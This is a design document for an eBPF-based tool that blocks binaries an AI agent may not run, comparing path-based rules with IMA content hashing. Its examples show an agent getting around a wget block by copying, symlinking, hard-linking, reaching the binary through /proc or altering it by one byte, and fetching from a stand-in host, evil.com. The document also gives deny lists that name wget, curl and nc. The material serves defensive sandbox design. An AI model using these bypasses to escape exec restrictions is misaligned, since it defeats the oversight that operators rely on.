# IMA Content Hashing & Kernel Integrity: A Deep Dive

## Table of Contents

1. [The Problem: Why Paths Lie](#the-problem)
2. [Linux Security Modules (LSM) — The Enforcement Framework](#lsm)
3. [IMA — Integrity Measurement Architecture](#ima)
4. [bpf_ima_file_hash — eBPF Meets Kernel Integrity](#bpf-ima-file-hash)
5. [Path-Based vs Hash-Based: A Complete Comparison](#path-vs-hash)
6. [How It All Fits Together in Guardian Shell](#guardian-shell-integration)
7. [Implementation Status & Blockers](#implementation-status)
8. [References](#references)

---

<a name="the-problem"></a>
## 1. The Problem: Why Paths Lie

File paths in Linux are just **names** — they are not identity. A file can have
multiple names (hard links), indirect names (symlinks), aliased names
(`/proc/self/root/...`), and its name can change at any time (`mv`, `cp`).

This is a fundamental problem for any security tool that answers the question
"should this process be allowed to run this binary?"

### Example: Three Names, One Binary

```bash
# The binary lives here
$ ls -la /usr/bin/wget
-rwxr-xr-x 1 root root 523456 Jan 15 /usr/bin/wget

# Create a hard link (same inode, same content, different name)
$ ln /usr/bin/wget /tmp/totally-legit-tool

# Create a symlink (indirect reference)
$ ln -s /usr/bin/wget /tmp/my-downloader

# Create a copy (different inode, same content)
$ cp /usr/bin/wget /tmp/helper

# All four of these are the SAME BINARY:
$ /usr/bin/wget                  # Original path
$ /tmp/totally-legit-tool        # Hard link
$ /tmp/my-downloader             # Symlink
$ /tmp/helper                    # Copy
```

A path-based security tool sees **four different things**. A content-hash-based
tool sees **one thing** — because the bytes are identical.

### Why This Matters for AI Agent Security

An LLM agent told "you cannot run wget" could discover:

```bash
# Agent's internal reasoning:
# "wget is blocked. Let me find another way..."

# Attempt 1: Copy it
cp /usr/bin/wget /tmp/fetch_data
/tmp/fetch_data http://evil.com/payload    # New name, same binary

# Attempt 2: Symlink it
ln -s /usr/bin/wget /tmp/network_tool
/tmp/network_tool http://evil.com/payload  # Symlink, same binary

# Attempt 3: Use /proc alias
/proc/self/root/usr/bin/wget http://evil.com/payload  # /proc trick

# Attempt 4: Hard link
ln /usr/bin/wget /tmp/data_fetcher
/tmp/data_fetcher http://evil.com/payload  # Hard link, same binary
```

Path-based enforcement fails on **all four**. Content hashing catches **all four**.

---

<a name="lsm"></a>
## 2. Linux Security Modules (LSM) — The Enforcement Framework

Before we can understand IMA, we need to understand LSM — because IMA is
built on top of it, and our eBPF hooks use it for enforcement.

### What is LSM?

LSM is a **framework inside the Linux kernel** that lets security modules
intercept and make access-control decisions at critical points in the kernel.
Think of it as a system of **checkpoints** placed at every security-sensitive
kernel operation.

```
┌─────────────────────────────────────────────────────────────┐
│                        User Space                           │
│                                                             │
│   Agent Process                                             │
│   ┌──────────────────┐                                      │
│   │ execve("/tmp/x") │ ─── syscall ───┐                    │
│   └──────────────────┘                 │                    │
├────────────────────────────────────────┼────────────────────┤
│                        Kernel Space    │                    │
│                                        ▼                    │
│   ┌────────────────────────────────────────────┐            │
│   │           VFS Layer (Virtual File System)  │            │
│   │                                            │            │
│   │  1. Resolve path → dentry → inode          │            │
│   │  2. Check DAC (traditional Unix perms)     │            │
│   │  3. ──► LSM HOOK: security_bprm_check() ◄──── HERE     │
│   │  4. If LSM says OK → load binary into memory│           │
│   │  5. Start execution                         │           │
│   └────────────────────────────────────────────┘            │
│                                                             │
│   LSM Hook Subscribers:                                     │
│   ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐     │
│   │ SELinux  │ │ AppArmor │ │   IMA    │ │ BPF LSM  │     │
│   │          │ │          │ │          │ │(Guardian)│     │
│   └──────────┘ └──────────┘ └──────────┘ └──────────┘     │
│                                                             │
│   ANY subscriber returning -EPERM → operation BLOCKED       │
└─────────────────────────────────────────────────────────────┘
```

### Key LSM Hooks Relevant to Us

The kernel has ~230 LSM hooks. Here are the ones that matter for exec and
file enforcement:

| Hook | When It Fires | What It Controls |
|------|--------------|-----------------|
| `bprm_check_security` | During `execve()`, **before** binary starts running | Whether a binary is allowed to execute |
| `file_open` | When a file is being opened | Whether a file open is allowed |
| `mmap_file` | When a file is memory-mapped | Whether `mmap` with `PROT_EXEC` is allowed |
| `inode_rename` | When a file is being renamed/moved | Whether rename is allowed |
| `inode_unlink` | When a file is being deleted | Whether delete is allowed |

### How LSM Hooks Work — The Call Chain

When a process calls `execve("/usr/bin/wget")`, the kernel does this:

```
execve() syscall entry
  │
  ├─► Tracepoint: sys_enter_execve         ← Guardian captures filename here
  │   (fires at syscall entry, before any kernel processing)
  │
  ├─► Kernel resolves path to inode
  │   (follows symlinks, checks permissions)
  │
  ├─► Kernel opens the binary file
  │   └─► LSM Hook: file_open              ← Guardian checks PENDING_DENY here
  │       (can block the open with -EACCES)
  │
  ├─► Kernel reads ELF headers, prepares binary
  │
  ├─► LSM Hook: bprm_check_security        ← Guardian checks PENDING_EXEC_DENY
  │   │                                        IMA computes/retrieves hash here
  │   │                                        BPF LSM can call bpf_ima_file_hash()
  │   │
  │   ├── If ANY LSM returns -EPERM → exec FAILS (binary never runs)
  │   └── If all LSMs return 0 → continue
  │
  ├─► Kernel maps binary into process memory
  │
  └─► New program starts executing
      (old process image is replaced)
```

**Critical insight:** `bprm_check_security` fires **after** the kernel has
resolved the full path and opened the file, but **before** the binary starts
running. This is the perfect place to compute a content hash — the kernel
already has the file open, and the binary hasn't executed a single instruction.

### BPF LSM — Programmable Security Hooks

Traditional LSM modules (SELinux, AppArmor) are compiled into the kernel.
BPF LSM (added in Linux 5.7) lets you attach **eBPF programs** to LSM hooks
at runtime — no kernel recompilation needed.

```c
// This is what the kernel does internally when BPF LSM is enabled:

// 1. At boot: register BPF LSM as an LSM module
//    (kernel config: CONFIG_BPF_LSM=y, lsm=bpf in boot params)

// 2. At runtime: userspace loads eBPF program and attaches to hook
//    attach_type = BPF_LSM_MAC
//    hook = "bprm_check_security"
//    program = <your eBPF bytecode>

// 3. On every execve(): kernel calls ALL registered LSM hooks
//    → SELinux checks its policy
//    → AppArmor checks its profile
//    → BPF LSM runs YOUR eBPF program
//    → If any returns non-zero → BLOCKED
```

Guardian Shell uses BPF LSM for:
- `file_open` → block unauthorized file access (checks `PENDING_DENY` map)
- `bprm_check_security` → block unauthorized exec (checks `PENDING_EXEC_DENY` map)

The IMA content hashing feature would **extend** the `bprm_check_security`
hook to also check the binary's SHA-256 hash.

### Sleepable vs Non-Sleepable Hooks

This is a crucial distinction for content hashing:

**Non-sleepable** (what Guardian Shell uses today):
- Hook runs in **atomic context** — cannot block, cannot do I/O
- Very fast — adds nanoseconds to each operation
- Limited to reading BPF maps and simple computations
- Suitable for: map lookups, flag checks, counter increments

**Sleepable** (what IMA hashing requires):
- Hook runs in **process context** — can block, can do disk I/O
- Slower — the thread sleeps while waiting for I/O
- Can call helpers like `bpf_ima_file_hash()` that read from disk
- Added in Linux 5.11 for specific hooks, expanded in 5.18

```
Non-sleepable hook (current Guardian Shell):
  CPU: [check map] [return] → ~50 nanoseconds

Sleepable hook (needed for IMA hashing):
  CPU: [call bpf_ima_file_hash] → [sleeping... disk I/O...] → [check map] [return]
  Time: ~50ns to ~5ms (depends on cache hit/miss)
```

The kernel enforces this at **BPF verification time** — if your hook is marked
non-sleepable and you try to call `bpf_ima_file_hash()`, the verifier
**rejects your program** before it ever loads:

```
libbpf: prog 'guardian_enforce_exec': BPF program load failed: Invalid argument
libbpf: prog 'guardian_enforce_exec': -- BEGIN PROG LOAD LOG --
calling sleepable helper bpf_ima_file_hash from non-sleepable prog
-- END PROG LOAD LOG --
```

---

<a name="ima"></a>
## 3. IMA — Integrity Measurement Architecture

### What is IMA?

IMA is a **kernel subsystem** (part of the Linux Integrity Subsystem) that
measures, appraises, and audits files. It was originally designed for
**Trusted Computing** — proving to a remote party that a system is running
exactly the software it claims to be running.

Think of IMA as a **fingerprint database** built into the kernel:

```
┌─────────────────────────────────────────────────────────────┐
│                     Linux Kernel                            │
│                                                             │
│   IMA Subsystem                                             │
│   ┌───────────────────────────────────────────────────────┐ │
│   │                                                       │ │
│   │  ┌─────────────┐    ┌──────────────────────────────┐ │ │
│   │  │ IMA Policy  │    │     IMA Measurement Log      │ │ │
│   │  │             │    │                              │ │ │
│   │  │ "Measure    │    │  /usr/bin/wget:              │ │ │
│   │  │  all exec'd │    │    sha256:a1b2c3d4e5f6...   │ │ │
│   │  │  binaries"  │    │  /usr/bin/curl:              │ │ │
│   │  │             │    │    sha256:f7e8d9c0b1a2...   │ │ │
│   │  │ "Appraise   │    │  /usr/lib/libc.so.6:        │ │ │
│   │  │  signed     │    │    sha256:1234567890ab...   │ │ │
│   │  │  binaries"  │    │                              │ │ │
│   │  └─────────────┘    └──────────────────────────────┘ │ │
│   │                                                       │ │
│   │  ┌─────────────────────────────────────────────────┐ │ │
│   │  │              Hash Cache (per-inode)              │ │ │
│   │  │                                                  │ │ │
│   │  │  inode 12345 → sha256:a1b2c3... (clean)        │ │ │
│   │  │  inode 67890 → sha256:f7e8d9... (clean)        │ │ │
│   │  │  inode 11111 → (dirty, needs rehash)            │ │ │
│   │  └─────────────────────────────────────────────────┘ │ │
│   │                                                       │ │
│   │  Three Operations:                                    │ │
│   │  1. MEASURE: Compute hash, add to measurement log    │ │
│   │  2. APPRAISE: Compare hash to expected value (xattr) │ │
│   │  3. AUDIT: Log hash to kernel audit subsystem        │ │
│   └───────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

### How IMA Computes Hashes

When IMA needs to hash a file, it does this **inside the kernel**:

```
Step 1: Check cache
  └─ inode has cached hash AND file hasn't been modified since?
     ├── YES → return cached hash immediately (~50ns)
     └── NO  → proceed to Step 2

Step 2: Read file content
  └─ Kernel reads the ENTIRE file into kernel memory, page by page
     (for a 50MB binary, this reads 50MB from disk)

Step 3: Compute SHA-256
  └─ Uses the kernel's crypto API (lib/crypto/sha256.c)
     Not a userspace library — this is the kernel's own implementation
     Processes the file content in chunks through the SHA-256 algorithm

Step 4: Cache the result
  └─ Store hash in the inode's security metadata
     Mark as "clean" (valid until file is modified)

Step 5: Return 32-byte hash
  └─ [a1][b2][c3][d4][e5][f6]...[32 bytes total]
```

**The key insight:** The eBPF program **never touches the file content**.
It calls `bpf_ima_file_hash()`, which delegates to IMA, which delegates to
the kernel crypto API. The eBPF program only ever sees the 32-byte result.

This is why it works within eBPF's constraints:
- **512-byte stack limit?** Only 32 bytes for the hash. No problem.
- **No file I/O in eBPF?** IMA does the I/O, not eBPF. (Requires sleepable hook.)
- **Limited computation?** SHA-256 runs in kernel crypto, not in eBPF bytecode.

### IMA's Hash Cache — Why Performance Is Acceptable

The biggest concern with hashing every binary on exec is performance.
IMA solves this with **per-inode caching**:

```
First execution of /usr/bin/wget:
  ┌─────────────────────────────────────────────────┐
  │ 1. bpf_ima_file_hash() called                   │
  │ 2. IMA checks cache → MISS                      │
  │ 3. IMA reads entire binary from disk (523KB)     │
  │ 4. IMA computes SHA-256 → a1b2c3d4...           │
  │ 5. IMA caches hash on inode                      │
  │ 6. Returns hash to eBPF program                  │
  │                                                   │
  │ Time: ~2-5ms (disk I/O + crypto)                  │
  └─────────────────────────────────────────────────┘

Second execution (and every subsequent one):
  ┌─────────────────────────────────────────────────┐
  │ 1. bpf_ima_file_hash() called                   │
  │ 2. IMA checks cache → HIT (file not modified)   │
  │ 3. Returns cached hash immediately               │
  │                                                   │
  │ Time: ~50-100ns (memory read only)                │
  └─────────────────────────────────────────────────┘

After file is modified (e.g., apt upgrade):
  ┌─────────────────────────────────────────────────┐
  │ 1. File write detected → cache entry invalidated │
  │ 2. Next bpf_ima_file_hash() → MISS              │
  │ 3. Full re-hash from disk                        │
  │ 4. New hash cached                               │
  └─────────────────────────────────────────────────┘
```

In practice, system binaries like `wget`, `curl`, `python3` are executed
frequently but modified rarely (only during package updates). The cache hit
rate is **extremely high** — typically 99%+ in steady state.

### IMA vs Userspace Hashing

Why not just hash binaries in userspace (in the Guardian daemon)?

```
Userspace hashing (TOCTOU vulnerable):

  Time ──────────────────────────────────────────────►

  Agent:     execve("/tmp/good_binary")
  Daemon:    reads /tmp/good_binary → hash matches allowlist ✓
  Attacker:  ← REPLACES /tmp/good_binary with malicious binary
  Kernel:    loads and executes /tmp/good_binary (now malicious!)

  The daemon approved the OLD content. The kernel ran the NEW content.
  This is a Time-Of-Check-Time-Of-Use (TOCTOU) race condition.


IMA kernel hashing (no TOCTOU):

  Time ──────────────────────────────────────────────►

  Agent:     execve("/tmp/binary")
  Kernel:    opens file, holds file lock
  IMA:       hashes file content WHILE KERNEL HOLDS THE LOCK
  BPF LSM:   checks hash against BLOCKED_HASHES map
             → hash is blocked → return -EPERM
  Kernel:    exec fails, file released

  No window for replacement. The hash is computed on exactly
  the bytes the kernel would execute.
```

This is one of the strongest arguments for kernel-side hashing — **there is
no race condition**. The hash is computed on the exact file content the kernel
is about to execute, while the kernel holds a reference to the file.

### Viewing IMA on Your System

```bash
# Check if IMA is enabled
$ cat /boot/config-$(uname -r) | grep CONFIG_IMA
CONFIG_IMA=y
CONFIG_IMA_MEASURE_PCR_IDX=10
CONFIG_IMA_LSM_RULES=y
CONFIG_IMA_DEFAULT_HASH="sha256"

# View IMA measurement log (what IMA has measured)
$ sudo cat /sys/kernel/security/ima/ascii_runtime_measurements
10 abc123... ima-ng sha256:a1b2c3... /usr/bin/bash
10 def456... ima-ng sha256:d4e5f6... /usr/bin/ls
10 789abc... ima-ng sha256:789abc... /usr/lib/x86_64-linux-gnu/libc.so.6
...

# View IMA policy
$ sudo cat /sys/kernel/security/ima/policy
measure func=BPRM_CHECK
measure func=FILE_CHECK mask=MAY_EXEC
appraise func=BPRM_CHECK

# Check IMA hash cached on a file (stored as extended attribute)
$ getfattr -n security.ima /usr/bin/wget
# file: usr/bin/wget
security.ima=0x0404... (binary hash data)
```

---

<a name="bpf-ima-file-hash"></a>
## 4. bpf_ima_file_hash — eBPF Meets Kernel Integrity

### The Helper Function

`bpf_ima_file_hash()` is a **BPF helper function** added in Linux 5.18 that
lets eBPF programs retrieve the IMA hash of a file. It bridges eBPF's
enforcement capabilities with IMA's integrity measurement.

```
┌─────────────────────────────────────────────────────────────┐
│                    eBPF Program                              │
│                                                             │
│  #[lsm(hook = "bprm_check_security", sleepable)]           │
│  fn check_exec(ctx: LsmContext) -> i32 {                    │
│      let file = /* get file pointer from bprm */;           │
│      let mut hash = [0u8; 32];                              │
│                                                             │
│      // This single call does ALL the heavy lifting:        │
│      let ret = bpf_ima_file_hash(file, &hash, 32);         │
│      //         │                  │      │    │            │
│      //         │                  │      │    └─ buffer size│
│      //         │                  │      └─ output buffer  │
│      //         │                  └─ kernel file pointer   │
│      //         └─ BPF helper (runs in kernel)              │
│                                                             │
│      if ret >= 0 {                                          │
│          // hash now contains 32-byte SHA-256               │
│          if BLOCKED_HASHES.get(&hash).is_some() {           │
│              return -1;  // BLOCK execution                 │
│          }                                                  │
│      }                                                      │
│      return 0;  // ALLOW execution                          │
│  }                                                          │
└──────────────────────────┬──────────────────────────────────┘
                           │
                           │ bpf_ima_file_hash()
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    Kernel IMA Subsystem                      │
│                                                             │
│  1. Receive file pointer from eBPF helper call              │
│  2. Check if inode has cached IMA hash                      │
│     ├── Cache HIT → return cached hash (fast path, ~50ns)  │
│     └── Cache MISS:                                         │
│         a. Read file pages from disk (page cache or I/O)    │
│         b. Feed pages through kernel SHA-256 implementation │
│         c. Store hash in inode security metadata            │
│         d. Return hash (slow path, ~1-5ms)                  │
│  3. Copy 32-byte hash into eBPF program's output buffer    │
│  4. Return number of bytes written (32) or negative error   │
└─────────────────────────────────────────────────────────────┘
```

### Function Signature (Kernel C)

```c
// From include/uapi/linux/bpf.h (Linux 5.18+)

/**
 * long bpf_ima_file_hash(struct file *file, void *dst, u32 size)
 *
 * Description:
 *     Retrieve the IMA hash of a file. If the hash has been
 *     previously computed (and the file has not been modified),
 *     return the cached hash. Otherwise, compute the hash by
 *     reading the file content.
 *
 * Parameters:
 *     file - Kernel file pointer (from LSM hook context)
 *     dst  - Output buffer for the hash
 *     size - Size of the output buffer (32 for SHA-256)
 *
 * Return:
 *     Number of bytes written to dst on success,
 *     negative error code on failure.
 *
 * Notes:
 *     - Can only be called from sleepable BPF programs
 *     - Requires CONFIG_IMA=y
 *     - Uses the kernel's default IMA hash algorithm (usually SHA-256)
 */
```

### What Happens Inside (Kernel Source Walk-Through)

Here's the actual kernel code path when `bpf_ima_file_hash()` is called:

```
bpf_ima_file_hash(file, dst, size)
  │
  ├─► ima_file_hash(file, dst, size)           [security/integrity/ima/ima_main.c]
  │     │
  │     ├─► Check inode->i_security for cached measurement
  │     │   ├── Cached & valid → memcpy hash to dst → return 32
  │     │   └── Not cached or stale → proceed
  │     │
  │     ├─► ima_collect_measurement()           [security/integrity/ima/ima_api.c]
  │     │     │
  │     │     ├─► Open file for reading (kernel_read)
  │     │     │
  │     │     ├─► Read file in PAGE_SIZE chunks (4KB each):
  │     │     │     while (offset < file_size) {
  │     │     │         kernel_read(file, buf, PAGE_SIZE, &offset);
  │     │     │         crypto_shash_update(sha256_ctx, buf, bytes_read);
  │     │     │     }
  │     │     │
  │     │     ├─► crypto_shash_final(sha256_ctx, hash)
  │     │     │   // SHA-256 finalization → 32-byte digest
  │     │     │
  │     │     └─► Store hash in inode integrity metadata
  │     │
  │     └─► memcpy(dst, hash, 32)
  │         return 32;
  │
  └─► eBPF program receives: ret = 32, dst = [32-byte SHA-256 hash]
```

### Memory Layout — Why 512-Byte Stack Limit Is Not a Problem

```
eBPF Stack (512 bytes max):
┌──────────────────────────────────────┐ offset 0
│ hash: [u8; 32]    (32 bytes)        │ ← SHA-256 output buffer
├──────────────────────────────────────┤ offset 32
│ ret: i64           (8 bytes)         │ ← return value
├──────────────────────────────────────┤ offset 40
│ file_ptr: *file    (8 bytes)         │ ← from LSM context
├──────────────────────────────────────┤ offset 48
│                                      │
│ ... 464 bytes of headroom remain ... │
│                                      │
└──────────────────────────────────────┘ offset 512

Total stack usage: ~48 bytes out of 512
The file content (potentially megabytes) NEVER touches the eBPF stack.
It's read and hashed entirely within the kernel's own memory.
```

Compare this to what you'd need if you tried to hash the binary yourself
in eBPF (which is impossible):

```
Hypothetical "hash it yourself" approach (IMPOSSIBLE):
┌──────────────────────────────────────┐
│ Would need:                          │
│  - File content buffer: 523,456 bytes│ ← wget is 523KB
│  - SHA-256 state: 108 bytes          │
│  - Stack: 512 bytes MAX              │ ← eBPF hard limit
│                                      │
│ 523,456 > 512  →  IMPOSSIBLE         │
└──────────────────────────────────────┘

Even with PerCpuArray scratch buffers:
  - eBPF cannot do file I/O (no kernel_read helper)
  - eBPF cannot call kernel crypto API directly
  - eBPF loop iterations are bounded (verifier enforced)
  - Computing SHA-256 on 523KB in bounded loops = verifier rejection
```

**This is exactly why `bpf_ima_file_hash()` exists.** It delegates the
impossible parts (file I/O, unbounded crypto) to the kernel, and gives
eBPF just the 32-byte result.

---

<a name="path-vs-hash"></a>
## 5. Path-Based vs Hash-Based: A Complete Comparison

### Side-by-Side: Same Attack, Different Outcomes

#### Attack 1: Copy and Rename

```bash
# Attacker copies blocked binary to new location
cp /usr/bin/wget /tmp/fetch_tool
```

**Path-based (Guardian Shell today):**

```
Exec policy:
  deny = ["/usr/bin/wget"]

Agent runs: /tmp/fetch_tool
  → Path is "/tmp/fetch_tool"
  → Does NOT match deny rule "/usr/bin/wget"
  → ALLOWED ❌ (bypass successful)
```

**Hash-based (with IMA):**

```
BLOCKED_HASHES map:
  sha256:a1b2c3d4... → DENY    (wget's content hash)

Agent runs: /tmp/fetch_tool
  → bpf_ima_file_hash() → sha256:a1b2c3d4... (same bytes = same hash)
  → Hash found in BLOCKED_HASHES
  → BLOCKED ✅ (bypass failed — same content, same hash)
```

#### Attack 2: Symlink

```bash
# Attacker creates symlink to blocked binary
ln -s /usr/bin/wget /tmp/downloader
```

**Path-based:**

```
Agent runs: /tmp/downloader
  → Tracepoint captures "/tmp/downloader" (raw syscall argument)
  → Does NOT match "/usr/bin/wget"
  → ALLOWED ❌
```

**Hash-based:**

```
Agent runs: /tmp/downloader
  → Kernel resolves symlink → opens /usr/bin/wget
  → bpf_ima_file_hash() on the RESOLVED file → sha256:a1b2c3d4...
  → BLOCKED ✅ (IMA hashes the actual file, not the symlink)
```

#### Attack 3: Hard Link

```bash
# Attacker creates hard link (same inode)
ln /usr/bin/wget /tmp/tool
```

**Path-based:**

```
Agent runs: /tmp/tool
  → Path is "/tmp/tool"
  → Does NOT match "/usr/bin/wget"
  → ALLOWED ❌
```

**Hash-based:**

```
Agent runs: /tmp/tool
  → Same inode as /usr/bin/wget → IMA cache hit
  → sha256:a1b2c3d4...
  → BLOCKED ✅ (same inode = same hash, instant cache hit)
```

#### Attack 4: /proc/self/root Trick

```bash
# Attacker uses /proc alias
/proc/self/root/usr/bin/wget http://evil.com
```

**Path-based:**

```
Agent runs: /proc/self/root/usr/bin/wget
  → Tracepoint captures "/proc/self/root/usr/bin/wget"
  → Does NOT match "/usr/bin/wget" (even with normalize_path,
    exec paths may not be fully normalized)
  → Depends on default policy
```

**Hash-based:**

```
Agent runs: /proc/self/root/usr/bin/wget
  → Kernel resolves through /proc → actual binary is /usr/bin/wget
  → bpf_ima_file_hash() → sha256:a1b2c3d4...
  → BLOCKED ✅ (hash doesn't care about the access path)
```

#### Attack 5: Modified Binary (Recompile)

```bash
# Attacker modifies one byte and recompiles
# Or just appends a null byte:
cp /usr/bin/wget /tmp/wget_mod
echo -ne '\x00' >> /tmp/wget_mod
chmod +x /tmp/wget_mod
```

**Path-based:**

```
deny = ["/usr/bin/wget"]
Agent runs: /tmp/wget_mod → NOT "/usr/bin/wget" → ALLOWED ❌
```

**Hash-based:**

```
Agent runs: /tmp/wget_mod
  → bpf_ima_file_hash() → sha256:DIFFERENT_HASH (content changed)
  → NOT in BLOCKED_HASHES
  → ALLOWED ❌ (hash changed — this is a known limitation)

  Mitigation: Use ALLOWLIST mode instead of DENYLIST mode.
  Only pre-approved hashes can execute. Unknown hashes are blocked.
```

### Comprehensive Comparison Table

| Property | Path-Based | Hash-Based (IMA) |
|----------|-----------|-----------------|
| **Identity basis** | File location (name) | File content (bytes) |
| **Survives copy** | No — new path, bypassed | Yes — same bytes, same hash |
| **Survives rename** | No — new path, bypassed | Yes — same bytes, same hash |
| **Survives symlink** | No — different path seen | Yes — kernel resolves before hashing |
| **Survives hard link** | No — different path seen | Yes — same inode, cache hit |
| **Survives /proc trick** | Partial (normalize_path helps) | Yes — kernel resolves fully |
| **Survives recompile** | Yes (still matches path) | No — different bytes, different hash |
| **Survives `apt upgrade`** | Yes (same path) | No — new version, new hash, needs policy update |
| **Per-agent policy** | Yes (different rules per agent) | Harder (hash map is global) |
| **Wildcard patterns** | Yes (`/usr/bin/net*`) | No (exact 32-byte match only) |
| **Human readable** | Yes (`deny = ["/usr/bin/wget"]`) | No (`deny = ["a1b2c3d4e5f6..."]`) |
| **Policy maintenance** | Low (paths are stable) | High (hashes change on updates) |
| **Performance** | Fast (string comparison) | Fast after cache (IMA caches per-inode) |
| **First-exec cost** | None | ~1-5ms (disk read + SHA-256) |
| **TOCTOU safe** | No (path checked, then file loaded) | Yes (hash computed on loaded file) |
| **Works in eBPF** | Yes (string matching in maps) | Yes (via `bpf_ima_file_hash` helper) |
| **Kernel version** | 5.7+ (BPF LSM) | 5.18+ (bpf_ima_file_hash) |

### When to Use Which

**Path-based is better for:**
- File access control (reading/writing data files — no hash to compute)
- Human-readable, maintainable policy
- Per-agent granularity (agent A can read X, agent B cannot)
- Wildcard patterns (`/home/user/project/**`)
- Environments where binaries update frequently

**Hash-based is better for:**
- Binary execution control (the binary IS its content)
- High-security environments where path manipulation is a real threat
- Allowlist-mode deployments (only known-good binaries may run)
- When you need TOCTOU safety (the hash IS the loaded content)
- Complementing path-based rules as a second layer

**Best approach: Use both together (defense in depth):**

```
Layer 1 — Path-based (Guardian Shell current):
  "Agent claude-agent can only execute binaries in /usr/bin/ and /usr/local/bin/"
  → Fast, readable, per-agent, catches most cases

Layer 2 — Hash-based (IMA addition):
  "Regardless of path, these specific binary hashes are NEVER allowed to execute"
  → Immune to path tricks, catches copy/rename/symlink bypasses

Together:
  Agent tries: cp /usr/bin/wget /usr/local/bin/helper
  → Path-based: /usr/local/bin/helper is in allow list → PASS
  → Hash-based: sha256 matches wget → BLOCKED ✅

  Neither layer alone catches this. Together, they do.
```

---

<a name="guardian-shell-integration"></a>
## 6. How It All Fits Together in Guardian Shell

### Current Architecture (Path-Based Exec Enforcement)

```
                    guardian-ebpf/src/main.rs

execve("/tmp/tool")
  │
  ▼
sys_enter_execve tracepoint (line 427)
  │
  ├─ Read filename from syscall args
  ├─ Identify agent (cgroup → TGID → comm)
  ├─ evaluate_exec_policy() (line 184)
  │    ├─ Check EXEC_DENY_EXACT map
  │    ├─ Check EXEC_DENY_PREFIXES LPM trie
  │    ├─ Check EXEC_ALLOW_EXACT map
  │    ├─ Check EXEC_ALLOW_PREFIXES LPM trie
  │    └─ Fall back to default (allow/deny)
  │
  ├─ If DENIED: set PENDING_EXEC_DENY[pid_tgid] = 1
  └─ Send event to userspace via EXEC_EVENTS perf buffer

  ... kernel processes execve ...

bprm_check_security LSM hook (line 535)
  │
  ├─ Check PENDING_EXEC_DENY[pid_tgid]
  │    ├─ Found → delete entry, return -EPERM (BLOCKED)
  │    └─ Not found → return 0 (ALLOWED)
  │
  └─ Done. Binary either runs or doesn't.
```

### Proposed Architecture (Path-Based + Hash-Based)

```
                    guardian-ebpf/src/main.rs (proposed)

execve("/tmp/tool")
  │
  ▼
sys_enter_execve tracepoint (UNCHANGED)
  │
  ├─ evaluate_exec_policy() → path-based check
  ├─ If DENIED by path: set PENDING_EXEC_DENY[pid_tgid] = 1
  └─ Send event to userspace

  ... kernel processes execve ...

bprm_check_security LSM hook (EXTENDED, now sleepable)
  │
  ├─ Step 1: Check PENDING_EXEC_DENY (existing path-based denial)
  │    └─ Found → return -EPERM (blocked by path policy)
  │
  ├─ Step 2: IMA hash check (NEW)
  │    ├─ Call bpf_ima_file_hash(bprm->file, &hash, 32)
  │    │    └─ IMA returns 32-byte SHA-256 (cached or computed)
  │    ├─ Look up hash in BLOCKED_HASHES map
  │    │    ├─ Found → return -EPERM (blocked by content hash)
  │    │    └─ Not found → continue
  │    │
  │    └─ (Optional) Look up hash in ALLOWED_HASHES map
  │         ├─ Found → return 0 (explicitly allowed)
  │         └─ Not found + allowlist mode → return -EPERM
  │
  └─ return 0 (allowed — passed both checks)


                    guardian/src/main.rs (proposed userspace)

Daemon startup:
  │
  ├─ Parse config.toml
  │    └─ New section: [agents.exec_hashes]
  │         deny_hashes = ["a1b2c3d4...", "f7e8d9c0..."]
  │         allow_hashes = ["1234abcd...", "5678efgh..."]
  │         mode = "denylist"  # or "allowlist"
  │
  ├─ For each hash in config:
  │    └─ Populate BLOCKED_HASHES BPF map
  │
  ├─ (Optional) Auto-hash: for each path in exec deny list:
  │    ├─ Read binary from disk
  │    ├─ Compute SHA-256 in userspace (sha2 crate)
  │    └─ Add hash to BLOCKED_HASHES map
  │    Note: This is convenience only — the authoritative
  │    check is in-kernel via IMA
  │
  └─ Attach eBPF programs (with sleepable bprm_check_security)
```

### New BPF Maps Required

```rust
// guardian-ebpf/src/main.rs (proposed additions)

/// Map of SHA-256 hashes that are BLOCKED from executing.
/// Key: 32-byte SHA-256 hash of binary content
/// Value: u8 (1 = blocked, presence check only)
///
/// Populated by userspace daemon from config or auto-hashing.
/// Checked in bprm_check_security LSM hook via bpf_ima_file_hash().
#[map]
static BLOCKED_HASHES: HashMap<[u8; 32], u8> = HashMap::with_max_entries(1024, 0);

/// (Optional) Map of SHA-256 hashes that are ALLOWED to execute.
/// Used in allowlist mode: only hashes in this map can run.
/// Empty map + allowlist mode = nothing can execute (fail-secure).
#[map]
static ALLOWED_HASHES: HashMap<[u8; 32], u8> = HashMap::with_max_entries(4096, 0);

/// Mode flag: 0 = denylist (block known-bad), 1 = allowlist (allow known-good only)
#[map]
static HASH_POLICY_MODE: Array<u8> = Array::with_max_entries(1, 0);
```

### Proposed Config Format

```toml
# config.toml additions

[[agents]]
name = "claude-agent"
identity = "cgroup"

[agents.exec]
default = "deny"
allow = ["/usr/bin/ls", "/usr/bin/cat", "/usr/bin/grep"]
deny = ["/usr/bin/wget", "/usr/bin/curl"]

# NEW: Hash-based exec control (requires Linux 5.18+ and CONFIG_IMA=y)
[agents.exec_hashes]
enabled = true
mode = "denylist"    # "denylist" or "allowlist"

# Explicit hash entries (hex-encoded SHA-256)
deny_hashes = [
    # wget (all versions/copies/symlinks blocked regardless of path)
    "a1b2c3d4e5f6789012345678901234567890123456789012345678901234abcd",
    # curl
    "f7e8d9c0b1a2345678901234567890123456789012345678901234567890efgh",
]

# Auto-hash: compute hashes from paths at startup (convenience feature)
# These are resolved to hashes and added to deny_hashes automatically
auto_hash_deny = ["/usr/bin/wget", "/usr/bin/curl", "/usr/bin/nc"]
```

---

<a name="implementation-status"></a>
## 7. Implementation Status & Blockers

### Current Status: NOT YET IMPLEMENTABLE

The feature is architecturally sound and the kernel supports it (Linux 5.18+),
but the **Rust eBPF tooling** is the blocker.

### Blocker: aya-ebpf Sleepable LSM Support

| Component | Status | Detail |
|-----------|--------|--------|
| Kernel `bpf_ima_file_hash()` helper | Available since Linux 5.18 | In-tree, stable API |
| Kernel sleepable BPF LSM | Available since Linux 5.11 | `bprm_check_security` supports sleepable attachment |
| `CONFIG_IMA` | Available in most distros | Ubuntu 22.04+, Fedora 36+, RHEL 9+ ship with IMA |
| **`aya-ebpf` sleepable macro** | **NOT YET AVAILABLE** | `#[lsm(hook = "...", sleepable)]` not in aya-ebpf 0.1.x |
